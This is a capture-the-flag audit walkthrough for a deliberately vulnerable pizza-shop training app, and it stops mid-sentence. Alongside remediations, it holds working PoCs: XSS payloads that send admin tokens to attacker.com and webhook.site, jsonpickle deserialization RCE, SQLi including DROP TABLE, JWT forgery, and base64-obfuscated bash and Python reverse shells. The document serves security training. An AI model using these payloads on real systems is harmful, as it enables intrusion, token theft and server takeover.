# MyPizzaApp CTF Walkthrough
**Table des matières**
- [MyPizzaApp CTF Walkthrough](#mypizzaapp-ctf-walkthrough)
  - [Consignes](#consignes)
  - [SAST and manual analysis](#sast-and-manual-analysis)
    - [Insecure Credentials](#insecure-credentials)
      - [Hardcoded Secrets](#hardcoded-secrets)
      - [Weak JWT Design and Role-in-Token Trust](#weak-jwt-design-and-role-in-token-trust)
      - [Weak Token Storage in localStorage](#weak-token-storage-in-localstorage)
      - [Weak Cryptography \& Guessable Hashes (CWE-327, CWE-330)](#weak-cryptography--guessable-hashes-cwe-327-cwe-330)
    - [Unexpected Content Injection](#unexpected-content-injection)
      - [XSS](#xss)
      - [SQLi](#sqli)
      - [Command Injection](#command-injection)
      - [Validation Issues](#validation-issues)
    - [Identity Usurpation](#identity-usurpation)
      - [IDOR](#idor)
      - [SSRF via Image URLs](#ssrf-via-image-urls)
      - [Route Guard Bypass on Client-Side Checks](#route-guard-bypass-on-client-side-checks)
      - [Bearer Token Bypass \& Algorithm Confusion](#bearer-token-bypass--algorithm-confusion)
      - [Mitm via Insecure CORS \& HTTP Origins](#mitm-via-insecure-cors--http-origins)
      - [Cleartext Credential or Token Interception via Nginx Reverse Proxy Misconfiguration](#cleartext-credential-or-token-interception-via-nginx-reverse-proxy-misconfiguration)
      - [Privilege Escalation: Self-Role Modification](#privilege-escalation-self-role-modification)
      - [Timing Attack Lure Vulnerability](#timing-attack-lure-vulnerability)
    - [Data Exposure](#data-exposure)
      - [Unrestricted Data Access via Unfiltered Endpoints](#unrestricted-data-access-via-unfiltered-endpoints)
      - [Missing 404 Route and Predictable Error Handling](#missing-404-route-and-predictable-error-handling)
      - [Exposed Source Maps, Debug Info and Server Metadata](#exposed-source-maps-debug-info-and-server-metadata)
    - [Supply Chain Vulnerabilities](#supply-chain-vulnerabilities)
  - [Exploitation](#exploitation)
    - [Setup](#setup)
    - [Exploit chain](#exploit-chain)
    - [JWT Forgery](#jwt-forgery)
    - [SSFR](#ssfr)
    - [SQLi](#sqli-1)
    - [IDOR](#idor-1)
    - [Auth guard failure](#auth-guard-failure)
  - [General Recommendations](#general-recommendations)


&nbsp;  
&nbsp;  

## Consignes
**Description du Challenge :**
Les développeurs d'UBIK Learning Academy s'apprêtent à lancer une pizzeria en ligne révolutionnaire, où les utilisateurs pourront acheter des pizzas et les payer avec des UBIKs, la monnaie virtuelle gagnée sur notre plateforme ! Avant le lancement officiel, ils vous confient un audit de sécurité de leur application. Vous avez accès au code de l'application sur votre laboratoire d'expérimentation en ligne. Vous pouvez également l'exécuter afin de mettre en pratique vos nouvelles compétences de Hacker éthique. 

**Objectifs :**
- Mener un audit de sécurité, en mode boite-blanche (avec la possibilité d'utiliser le code source de l'application), de bout en bout pour identifier les failles de l'application cible
- Exploiter les vulnérabilités et simuler un scénario d'attaque où chaque faille découverte vous permet de progresser jusqu'à la compromission du serveur
- Retrouvez les différents flags cachés qui s'affichent lorsque vous parvennez à atteindre chacune des étapes d'exploitation disponibles
- Réalisez un rapport d'audit de sécurité complet pour documenter votre travail

**Livrable :**
Rédigez un rapport de sécurité détaillé avec un outil comme Sysreptor. 
Ce rapport devra inclure :
- Une analyse approfondie de chaque faille identifiée dans l’application
- La méthode d'exploitation de chacune d'elles
- Des axes de remédiations qui permettent de corriger les failles trouvées
- Un scénario d'attaque complet démontrant comment un attaquant pourrait avancer étape par étape jusqu'à la compromission du serveur d'application

---

&nbsp;  


## SAST and manual analysis
### Insecure Credentials
#### Hardcoded Secrets
- **Severity:** Critical
 - **RReference:** [CWE-798 - Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html) & [CWE-1392 - Default Credentials in Configuration](https://cwe.mitre.org/data/definitions/1392.html)
- **Constat:** Multiple hardcoded secrets in Docker and the application code, including JWT secrets and database credentials.
  - *MyPizzaApp/docker-compose.yml*: 
    - Static JWT: `SuperSecretKeyThatIsTottalyNotRandom`
    - DB URL with credentials: `postgresql+asyncpg://awefull_pizza_shop:awefull_password@postgres/awefullpizzashop`
    - PostgreSQL password: `POSTGRES_PASSWORD: awefull_password`
  - *MyPizzaApp\backend\src\awefull_pizza_shop\webserver\config.py*:
    - Static JWT: `JWT_SECRET_KEY = "changeme"`
  - *MyPizzaApp\frontend\AwefullPizzaShop\src\environments\environment.prod.ts*:
    - Static JWT: `jwtSecret: "SuperSecretKeyThatIsTottalyNotRandom"`
  - *MyPizzaApp\backend\alembic.ini*:
    - Exposed DB credentials in config file: `sqlalchemy.url = postgresql+asyncpg://awefull_pizza_shop:awefull_password@postgres/awefullpizzashop`
- **Impact:**
  - JWT forgery possible in case of access to code/config (white-box, repo leak, backup, logs).
  - Lateral movement facilitated towards the database.
- **PoC:**
  ```python
  import jwt
  payload = {'sub': 'username:admin_user', 'role': 'Admin', 'exp': 9999999999}
  token = jwt.encode(payload, "changeme", algorithm="HS256")
  # Token now valid for all admin endpoints
  ```
- **Remediation:**
  - Remove all hardcoded secrets from code and config.
  - Use environment variables or a secrets manager for sensitive values.
  - Rotate secrets after remediation and monitor for leaks.
  - Enforce strong, random secrets with sufficient entropy (e.g., `secrets.token_hex(32)` for JWT).

&nbsp;  
#### Weak JWT Design and Role-in-Token Trust
- **Severity:** Critical
- **RReference:** [CWE-345 - Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- **Constat:**
  - `xss-poller.mjs` explicitly signs a token with `{'sub': 'username:admin_user', 'role': 'Admin'}`.
  - The Angular frontend decodes the JWT client-side and trusts the `role` claim in `AdminGuard`.
  - The role is stored inside the token and used as an authorization source on the client, which is fully attacker-controlled once the token is edited.
- **Impact:**
  - Anyone who can forge or steal a JWT can present themselves as `Admin` in the UI.
  - Client-side role checks are not a security boundary.
- **PoC:**
  - Edit `localStorage.access_token` with any JWT containing `role: Admin` and refresh the page.
  - The frontend admin navigation and route guard will accept it if the token parses.
- **Remediation:**
  - Treat JWT claims as untrusted hints on the client.
  - Enforce authorization on the server for every privileged action.
  - Keep the token minimal and avoid relying on the UI role for anything security-critical.

&nbsp;  
#### Weak Token Storage in localStorage
- **Severity:** Critical
- **RReference:** [CWE-922 - Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)
- **Constat:**
  - `auth.service.ts` stores `access_token` in `localStorage`.
  - Any XSS payload or malicious extension can read it.
  - The token remains available across tabs and browser restarts.
- **Impact:**
  - Full session theft after any script execution in origin.
  - Persistent access until logout or token expiration.
- **PoC:**
  ```javascript
  console.log(localStorage.getItem('access_token'));
  ```
- **Remediation:**
  - Prefer HttpOnly secure cookies for session material.
  - If storage is unavoidable, reduce token lifetime and rotate often.
  - Never expose long-lived admin tokens to frontend JavaScript.

&nbsp;  
#### Weak Cryptography & Guessable Hashes (CWE-327, CWE-330)
- **Severity:** High
- **Reference:** [CWE-327 - Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
- **Constat:**
  - JWT Algorithm: HS256 (symmetric) with weak secret (~32 bits entropy vs 256+ recommended)
  - JWT Secret: `"SuperSecretKeyThatIsTottalyNotRandom"` (dictionary phrase, human-guessable)
  - No rate limiting on token generation or password verification
- **PoC:**
  ```bash
  # Offline brute-force with wordlists
  john --wordlist=rockyou.txt jwt_token
  # Or try common weak secrets
  for secret in "changeme" "SuperSecretKeyThatIsTottalyNotRandom" "test"; do
    python3 -c "import jwt; print(jwt.encode({'role':'Admin'}, '$secret', 'HS256'))"
  done
  ```
- **Impact:**
  - Brute-force JWT secret offline or via dictionary attack
  - Forge unlimited valid tokens once secret is known
  - Potential GPU-based password hash cracking if bcrypt cost is weak
- **Remediation:**
  - Use RS256 (asymmetric) with 2048+ bit RSA keys or EdDSA
  - If HS256 required, enforce 256-bit random secret: `secrets.token_hex(32)`
  - Enforce bcrypt cost >= 13
  - Implement rate limiting on `/token` endpoint (max 5 attempts/minute)
  - Add secret rotation strategy

&nbsp;  
&nbsp;  
### Unexpected Content Injection
#### XSS
- **Severity:** Critical
 - **Reference:** [CWE-79 - Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html) & [CWE-306 - Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- **Constat:**
  - `MyPizzaApp/frontend/AwefullPizzaShop/src/app/pizza/pizza-comment-card/pizza-comment-card.component.html` and `.ts` render user comments with `bypassSecurityTrustHtml` without sanitization (c.f. [Validation Issues](#validation-issues)).
  - At comment creation, `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/comment.py`, calls a bot which visits the pizza page with an admin token injected into localStorage. The bot is exposed via `MyPizzaApp/xss-poller.mjs` on a public `GET /:id` endpoint without authentication or request validation.
- **PoC:**
  1. Create a comment with the payload: `<script>fetch('http://attacker.com/steal?cookie='+localStorage.getItem('access_token'))</script>`
  2. When the bot visits the page, it executes the script and sends the admin token to the attacker's server.
  3. The attacker can then use this token to access admin routes or trigger server-side exploits.
- **Impact:**
  - Any attacker who can reach the service can make the admin bot browse arbitrary pizza pages.
  - Admin session theft via XSS (`localStorage.access_token` read).
  - Full admin interface access and potential server compromise via bot abuse.
- **Remédiation:**
  - Protect the bot endpoint with authentication and request validation.
  - Restrict it to trusted internal callers only.
  - Never expose privileged browsing automation on a public interface.


&nbsp;  
#### SQLi
- **Severity:** High
 - **Reference:** [CWE-89 - SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- **Constat:** SQL injection via the category filter in the pizza listing endpoint. The code constructs a raw SQL query with string interpolation instead of using parameterized queries or ORM filtering. It is exposed on `/pizza/category/{category}` and is ran in `MyPizzaApp/backend/src/awefull_pizza_shop/database/pizza/repository.py` at `text(f"category='{category}'")`.
- **PoC:**
  - Query the endpoint: `/api/pizza/category/meat'%20OR%201=1--`
  - This would result in a SQL query like: `SELECT * FROM pizza WHERE category='meat' OR 1=1--'`, which returns all pizzas regardless of category.
- **Impact:**
  - Data exfiltration: an attacker can retrieve all pizza records, including sensitive information if present.
  - Potential for more destructive SQLi payloads if the database user has write permissions (e.g., `'; DROP TABLE pizza;--`).
- **Remediation:**
  - Use parameterized queries or ORM filtering instead of raw SQL string interpolation.
  - Whitelist allowed categories and validate input against it before querying.

&nbsp;  
#### Command Injection
- **Severity:** Critical, P0
 - **Reference:** [CWE-502 - Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- **Constat:** `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/pizza.py` deserialize untrusted input from the request body using `jsonpickle.decode(..., safe=False)`. This allows for unsafe deserialization of arbitrary objects, which can lead to remote code execution if a malicious payload is crafted and sent to the `/api/pizza/create` endpoint with admin authentication.
- **Impact:**
  - An attacker with admin access can send a specially crafted JSON payload that, when deserialized, executes arbitrary code on the server.
- **PoC:**
  - Call the pizza creation endpoint with a crafted JSON payload that includes `py/object` or other jsonpickle gadget to trigger code execution. For example:
  ```json
  {
    "name": "EvilPizza",
    "description": "This is a malicious pizza",
    "price": 9.99,
    "image_url": "http://attacker.com/evil.jpg",
    "category": "MEAT",
    "py/object": "os.system",
    "args": ["curl http://attacker.com/steal?data=$(cat /etc/passwd)"]
  }
  ```
   - This payload would execute the `curl` command on the server, sending the contents of `/etc/passwd` to the attacker's server.
- **Remediation:**
  - Delete `jsonpickle.decode()` call on untrusted data.
  - Enforce a strict schema validation for pizza creation using Pydantic models, rejecting any payload that contains suspicious keys or structures.

&nbsp;  
#### Validation Issues
- **Severity:** Very High
- **Reference:** [CWE-20 - Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html) & [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
- **Constat:**
  - `pizza-comment-card.component.ts` uses `bypassSecurityTrustHtml` on user-generated comments without sanitization and renders them with `[innerHTML]` in `pizza-comment-card.component.html`.
  - Pizza creation and editing accept free-form `name`, `description`, `imageUrl`, and `category` values without server-side validation.
  - User edition accepts `email`, `name`, and `role` through `user-edit-dialog.component.ts` without strict validation or ownership checks.
  - Login and register flows submit values with weak front-end validation only.
  - The UI does not enforce server-safe allowlists before sending content that can later be rendered or processed, leading to multiple injection points (XSS, SSRF, role tampering).
- **Impact:**
  - Stored XSS in comments can lead to admin token theft and bot abuse since it is rendered with `bypassSecurityTrustHtml`.
  - Unvalidated pizza fields can lead to SSRF or XSS if rendered unsafely.
  - User role tampering can lead to privilege escalation if backend checks are weak.
  - If `image_url` is rendered directly in HTML, it can lead to XSS via `javascript:` URLs.
- **PoC:**
  - Submit a comment with `<script>alert('XSS')</script>` and observe whether it executes when the admin bot visits the page.
  - Submit a pizza with `image_url` set to `javascript:alert('XSS')` and observe whether it executes when rendered.
- **Remediation:**
  - Implement strict server-side validation for all user inputs with allowlists.
  - Remove `bypassSecurityTrustHtml` and render comments as plain text or sanitize them on the server with a strict allowlist of tags and attributes.
  - Render `image_url` safely by validating it to only allow `http://` and `https://` schemes, and using Angular's DomSanitizer properly. 


&nbsp;  
&nbsp;  
### Identity Usurpation
#### IDOR
- **Severity:** High
- **Reference:** [CWE-639 - Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- **Constat:**
  - `backend/src/awefull_pizza_shop/webserver/routers/user.py`
    - returns the user ID without ownership check at `/users/{user_id}`
    - POST `/users/{user_id}`allows updating ANY user with only admin role check
    - No validation: `if current_user.id != target_user_id and current_user.role != ADMIN: raise 403`
- **Impact:**
  - Enumerate all users via sequential requests: `/api/users/550e8400-e29b-41d4-a716-000000000001`
  - Extract emails, roles, metadata without authentication
  - Change ANY user's password, email, or role as admin
  - Potential privilege escalation if role changes are unvalidated
- **PoC:**
  ```bash
  # Enumerate users (even as normal user if access is unprotected)
  curl http://localhost:7465/users/550e8400-e29b-41d4-a716-446655440000 \
    -H "Authorization: Bearer <normal_user_token>"
  ```
- **Remediation:**
  - Add strict ownership checks in update endpoint
  - Prevent role changes by unprivileged users
  - Paginate or rate-limit ID enumeration
  - Log suspicious sequential access patterns

&nbsp;  
#### SSRF via Image URLs
- **Severity:** High
- **Reference:** [CWE-918 - Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- **Constat:**
  - Pizza endpoints accept ANY URL without protocol or domain checking
  - `schemas/pizza.py` doesn't validate `image_url: str`
  - Backend/bots may fetch these URLs, exposing internal network
- **Impact:**
  - File URL exfiltration: `file:///etc/passwd`, `file:///root/.ssh/id_rsa`
  - Internal network scanning: `http://internal-db:5432`, `http://localhost:8000`
  - XXE if image endpoint returns XML
  - Potential for protocol smuggling (gopher://, dict://)
- **PoC:**
  ```bash
  curl -X POST http://localhost:7465/pizza/create \
    -H "Authorization: Bearer <admin_token>" \
    -d '{
      "name":"Pwned",
      "description":"test",
      "price":9.99,
      "image_url":"file:///etc/passwd",
      "category":"MEAT"
    }'
  # When bot or user fetches this, file content may be exposed
  ```
- **Remediation:**
  - Whitelist URL schemes: only `http://` and `https://`
  - Reject `javascript:`, `data:`, `file://`, `gopher://`, `dict://`, etc.
  - Validate domain against allowlist (e.g., CDN domains only)
  - Implement timeout and size limits on URL fetches
  - Use Pydantic `HttpUrl` validator for stricter validation


&nbsp;  
#### Route Guard Bypass on Client-Side Checks
- **Severity:** High
- **Reference:** [CWE-602 - Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html)
- **Constat:**
  - `AuthGuard` only checks `localStorage` presence through `isLoggedIn()`.
  - `AdminGuard` only checks the decoded JWT payload.
  - None of these guards validate server-side session state before allowing the route.
- **Impact:**
  - Any attacker who edits browser storage can bypass the visible route protection.
  - A forged or replayed token becomes enough to open the admin UI.
- **PoC:**
  - Set any non-empty string in `localStorage.access_token` and refresh.
  - If `getUserRole()` returns `Admin`, the admin route opens.
- **Remediation:**
  - Move trust to the backend and keep guards as UX only.
  - Fetch the current user profile from the server and verify it before rendering sensitive pages.
  - Clear state on decode errors instead of treating them as partial success.


&nbsp;  
#### Bearer Token Bypass & Algorithm Confusion
- **Severity:** Low
- **Reference:** [CWE-347 - Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
- **Constat:**
  - In `security/service.py`, `jwt.decode()` may accept multiple algorithms risking algorithm confusion or unsigned tokens bypasses if not configured properly.
- **Impact:**
  - Attacker supplies unsigned JWT (`alg: "none"`)
  - Attacker switches algorithm to one with known key (if keys are exposed)
  - Expired tokens accepted if `exp` validation is missing
- **PoC:**
  ```python
  # Create unsigned JWT
  import jwt
  payload = {'sub': 'username:admin_user', 'role': 'Admin'}
  token = jwt.encode(payload, "", algorithm="none")
  # This might be accepted depending on configuration
  ```
- **Remediation:**
  - Enforce strict algorithm: `jwt.decode(..., algorithms=["HS256"])` ONLY
  - Verify `exp` (expiration) is validated
  - Reject tokens with `alg: "none"`
  - Use PyJWT 2.x with strict defaults
  - Verify algorithm matches exactly before processing


&nbsp;  
#### Mitm via Insecure CORS & HTTP Origins
- **Severity:** High
- **Reference:** [CWE-319 - Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- **Constat:**
  - `config.py` lines 44-46: Allowed CORS origins include `http://` (not HTTPS):
    ```python
    "http://127.0.0.1:4200", "http://localhost:4200", "http://0.0.0.0:4200"
    ```
  - No HSTS header, tokens sent over cleartext HTTP
  - No secure cookie flags
- **Impact:**
  - Network attacker intercepts HTTP traffic and steals JWT tokens
  - MitM attacker modifies API responses (e.g., prices, roles)
  - Attacker injects malicious code via response modification
- **PoC:**
  ```bash
  # Network attacker performs ARP spoofing
  arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
  # Proxy HTTP traffic with mitmproxy
  mitmproxy -p 7465
  # Intercept and steal Authorization headers
  ```
- **Remediation:**
  - Enforce HTTPS in production:
    ```python
    if not settings.DEBUG:
      ALLOWED_ORIGINS = ["https://app.example.com"]
    ```
  - Implement HSTS: `Strict-Transport-Security: max-age=63072000; includeSubDomains`
  - Set secure cookie flags: `HttpOnly`, `Secure`, `SameSite=Strict`
  - Remove all `http://` origins in production
  - Force HTTPS redirect


&nbsp;  
#### Cleartext Credential or Token Interception via Nginx Reverse Proxy Misconfiguration
- **Severity:** Low to Medium
- **Reference:** [CWE-319 - Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- **Constat:**
  - `nginx.conf` listens on both `80` and `443` in the same server block.
  - There is no explicit redirect from HTTP to HTTPS.
  - The proxy forwards `/api` to `http://backend:7465` and relies on `X-Forwarded-Proto: https`, but that does not prevent direct cleartext access if the public HTTP listener is reachable.
- **Impact:**
  - Credentials, JWTs, and cookies can be intercepted on HTTP if clients ever hit port 80.
  - Mixed deployment paths make it easier to misroute traffic around TLS.
- **PoC:**
  - Request the site over `http://app1.tiweb.tp.ubik.academy` and inspect whether the browser or proxy upgrades it automatically.
  - If not, credentials sent to `/login` or `/token` can be observed in cleartext by an on-path attacker.
- **Remediation:**
  - Add a dedicated HTTP server block that returns `301` to HTTPS.
  - Keep backend traffic internal only and expose only the TLS listener.
  - Add security headers at the proxy layer.
  - Enforce HSTS to prevent fallback to HTTP in browsers.


&nbsp;  
#### Privilege Escalation: Self-Role Modification
- **Severity:** Critical
- **Reference:** [CWE-269 - Improper Access Control](https://cwe.mitre.org/data/definitions/269.html)
- **Constat:**
  - Update endpoint in `routers/user.py` does NOT validate role change authorization (`schemas/user.py`'s, `UserUpdate` includes `role: UserRole` field)
  - Unprivileged users can POST with `"role": "Admin"` to escalate
- **Impact:**
  - Privilege escalation in single request
  - Full access to all admin endpoints (RCE, user management)
- **PoC:**
  ```bash
  # Get own user ID
  curl http://localhost:7465/users \
    -H "Authorization: Bearer <normal_user_token>" | grep '"id"'
  
  # Escalate to admin
  curl -X POST http://localhost:7465/users/550e8400-e29b-41d4-a716-446655440001 \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"name":"user","email":"user@example.com","role":"Admin"}'
  
  # Now exploit admin RCE
  ```
- **Remediation:**
  - Remove `role` field from `UserUpdate` schema
  - Or create separate admin-only endpoint for role changes
  - Add explicit authorization check preventing self-escalation


&nbsp;  
#### Timing Attack Lure Vulnerability
- **Severity:** Medium
- **Reference:** [CWE-208 - Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
- **Constat:**
  - In `security/service.py`, they try to use an hardcoded bcrypt hash (`PROTECTION_AGAINST_TIMING_ATTACK`) to avoid timing attacks enabling user enumeration. However, this hash is static and predictable.
- **Impact:**
  - Username enumeration: valid users take slightly longer (real bcrypt) vs invalid (fake bcrypt)
  - Attacker distinguishes user existence via statistical timing analysis
  - Pre-computed password cracking if fake hash value is known
- **PoC:**
  ```bash
  # Statistical timing analysis
  for i in {1..100}; do
    time curl -X POST http://localhost:7465/token \
      -d "username=admin&password=wrong" >> admin_times.txt
    time curl -X POST http://localhost:7465/token \
      -d "username=nonexistent&password=wrong" >> nonexistent_times.txt
  done
  # Analyze: real users should show slightly different timing
  ```
- **Remediation:**
  - Generate **random** lure hash at runtime (never reused)
  - Implement constant-time password comparison using `secrets.compare_digest()`
  - Rate limit `/token` endpoint to prevent timing attack exploitation


&nbsp;  
&nbsp;  
### Data Exposure
#### Unrestricted Data Access via Unfiltered Endpoints
- **Severity:** High
- **Reference:** [CWE-639 - Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- **Constat:**
  - The comment listing endpoint (`/pizza/{pizza_id}/comments/`) does not filter comments by `pizza_id` and returns all comments regardless of the pizza they belong to. This allows any user to access comments for all pizzas, which may include sensitive information or lead to further attacks.
- **Impact:**
  - Data leakage: users can see comments that may contain sensitive information or internal discussions.
  - Information gathering for further attacks (e.g., finding clues about admin activity or vulnerabilities).
- **PoC:**
  - Request `/api/pizza/1/comments/` and observe that it returns comments for all pizzas, not just pizza with ID 1.
- **Remediation:**
  - Filter comments by `pizza_id` in the database query to ensure only relevant comments are returned.
  - Add authorization checks if comments contain sensitive information or should be restricted to certain users.


&nbsp;  
#### Missing 404 Route and Predictable Error Handling
- **Severity:** Low
- **Reference:** [CWE-425 - Direct Request for 'Hidden' File or Resource](https://cwe.mitre.org/data/definitions/425.html)
- **Constat:**
  - `app.routes.ts` has the wildcard route commented out.
  - Invalid routes are not centrally handled, which makes probing and error behavior more predictable.
- **Impact:**
  - Attackers can enumerate route structure from error handling and fallback behavior.
  - Missing 404 routing often exposes application internals during probing.
- **PoC:**
  - Navigate to random paths such as `/adminn`, `/pizza/../login`, or `/does-not-exist` and inspect the behavior.
- **Remediation:**
  - Reintroduce a catch-all route with a safe 404 component.
  - Make invalid routes return a consistent, non-informative response.


&nbsp;  
#### Exposed Source Maps, Debug Info and Server Metadata
- **Severity:** Medium
- **Reference:** [CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html) & [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- **Constat:**
  - `environment.ts` ships the API base URL into the browser bundle.
  - `tsconfig.json` enables `sourceMap: true`, which is dangerous if production builds keep sourcemaps enabled.
  - `alembic.ini` and `config.py` expose database credentials and JWT secrets in plaintext.
  - Nginx does not hide server version or add security headers.
  - `xss-poller.mjs` exposes the framework (Express) in `X-Powered-By` header.
- **Impact:**
  - Sourcemaps and bundle artifacts can reveal source paths, component names, comments, and implementation details in Chrome DevTools.
  - Attackers can reconstruct the frontend codebase and discover hidden routes or logic.
  - Internal endpoints, comments, and helper names become easier to target.
- **PoC:**
  - Open DevTools on a production build and inspect loaded `.map` files or source trees.
- **Remediation:**
  - Disable sourcemaps for production unless they are access-controlled.
  - Keep environment files free of secrets.
  - Audit the build output to ensure no unintended debug metadata is shipped.
  - Add security headers in Nginx:
    - `Server: MyPizzaApp` (hide version)
    - `X-Content-Type-Options: nosniff`
    - `X-Frame-Options: DENY`
    - `X-XSS-Protection: 1; mode=block`
  - Add `app.disable('x-powered-by')` in Express to hide framework information.




### Supply Chain Vulnerabilities
**Severity:** Low
**Reference:** [CWE-494 - Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html) & [CWE-1395 - Dependency on Vulnerable Third-Party Component](https://cwe.mitre.org/data/definitions/1395.html) & [CWE-506 - Embedded Malicious Code](https://cwe.mitre.org/data/definitions/506.html)
**Constat:**
  - `Dockerfile-xss-poller` uses `npm install` without `--ignore-scripts`, allowing `preinstall/postinstall` hooks to run arbitrary code during build.
  - `backend/Dockerfile` uses `pip install` without `--only-binary :all:`, allowing `setup.py` scripts of dependencies to execute code during installation.
**Impact:**
  - An attacker who can modify the dependency tree (e.g., via a compromised package or a malicious fork) can execute code during the build phase, potentially compromising the build environment or injecting malicious code into the final image.
**PoC:**
  - For `npm`, create a malicious package with a `preinstall` script that runs a command (e.g., `echo "Malicious code executed"`).
  - For `pip`, create a package with a `setup.py` that executes code during installation.
  - Build the Docker images and observe the execution of the malicious code in the build logs.
**Remediation:**
  - For `npm`, use `npm ci` with a lockfile to ensure deterministic builds and add `--ignore-scripts` if compatible with the dependencies.
  - For `pip`, use `--only-binary :all:` to prevent building from source and ensure that only pre-built wheels are installed, or audit the dependencies for any that require building from source and review their setup scripts.



## Exploitation
### Setup
- Tools needed: browser (DevTools), Burp or ZAP (HTTP proxy), curl, jq, jwt-cli or Python (PyJWT), dirb/gobuster (optional).
- Start the app `./LaunchApp` (on your VM) and the proxy; ensure browser is configured to proxy traffic through Burp/ZAP.
  - Go to `http://localhost:443/` instead of `https://localhost/`.
  - Register `https://app1.tiweb.tp.ubik.academy/api` in your hosts file to point to `localhost` if you want to use the `ubik` hostname. In `C:\Windows\System32\drivers\etc\hosts`, add `127.0.0.1 app1.tiweb.tp.ubik.academy`
  - For local Docker use, change the Angular production API URL to a relative URL: `apiUrl: '/api'`
  - `docker compose exec -T backend alembic upgrade head` to run DB migrations if they fail on first launch. Or clean up with `docker compose down -v` and try again.
- Register a normal user; capture `/register` request/response.
- Login; capture `/token` or `/auth` request/response and note where `access_token` appears.
- Inspect how `access_token` is stored (localStorage according to analysis) and whether refresh occurs.


---

&nbsp;  
&nbsp;  
### Exploit chain
- Register new user
- Add a comment with `<img src="x" onerror="window.location.href='https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?token=' + localStorage.getItem('access_token') + '&page=' + window.location.pathname + '&user=xss_poller';">`
- Go to the webhook.site URL and wait for the token to be exfiltrated by the bot visiting the pizza page:![alt text](./exploitation/xss_poller_runs_exploit.png)
  The token is only valid for 1 minute !!! (`expiresIn: '1m'`).
- Use the stolen token to call the deserialization endpoint: 
  ```bash
  curl -k -X POST https://app1.tiweb.tp.ubik.academy/api/pizza/create -H "Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTphZG1pbl91c2VyIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc4ODM5NzM2LCJleHAiOjE3Nzg4Mzk3OTZ9.DUCPF1i0c01DsPDpMNqZOAZ6LJ_AfAIV5gnQiDuVagA" -H "Content-Type: application/json" -d '{"name":"test","description":"test","price":10,"image_url":"http://example.com/image.jpg","ingredients":["test"],"allergens":["test"]}'
  ```
- Or directly in the XSS:
  ```javascript
  <script>
    fetch('/pizza/create', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('access_token'),
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "py/reduce": [
          {"py/type": "os.system"},
          {"py/tuple": ["curl https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?pwned=$(whoami | base64)"]}
        ]
      })
    });
  </script>
  ```
  - Via the image onerror:
    ```html
    <img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/reduce':[{'py/type':'os.system'},{'py/tuple':['curl https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?pwned=$(whoami | base64)']}]})});">
    ```
  ![Remote code execution](./exploitation/rce.png)

- Reverse shell:
 - On your machine run: `ncat -lvnp 9001`, `ip a` to get your IP, then base64 encode the reverse shell command and use it in the payload: `echo -n "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1'" | base64`
 - On the target, the payload will decode and execute the reverse shell: `<img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/reduce':[{'py/type':'os.system'},{'py/tuple':['echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85MDAxIDA+JjEn | base64 -d | bash']}]})});">`

- Here, `ip a` gives `127.19.0.1` for the bridge with Docker.
- We use this payload: `echo -n "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"172.27.248.70\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" | base64 -w 0` which equates to `cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yNy4yNDguNzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=`  
- Payload (we use os.system or subprocess.getoutput which is more stealthy, no process created, but might be detected by EDRs if they look for long-running commands or base64 decoding):  
